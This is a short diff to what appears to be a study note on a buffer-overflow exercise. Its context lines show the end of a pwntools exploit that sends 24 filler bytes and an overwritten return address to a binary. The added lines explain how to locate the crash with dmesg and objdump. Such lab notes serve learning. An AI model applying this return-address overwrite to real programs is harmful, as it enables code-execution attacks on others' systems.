@@ -83,4 +83,19 @@ ret_addr = pwn.p64(0x4011af)
 
 r.send(b"A"*24+ret_addr)
 print(r.readall())
+
+
+after you run a program and get segmentation fault you can do 
+
+dmesg | tail -n1 
+
+
+and then see where the program crasshed 
+
+then do objdump -M intel -d buffer_overflow
+
+and then see what instruction actually caused it to crash 
+
+
+
 ```
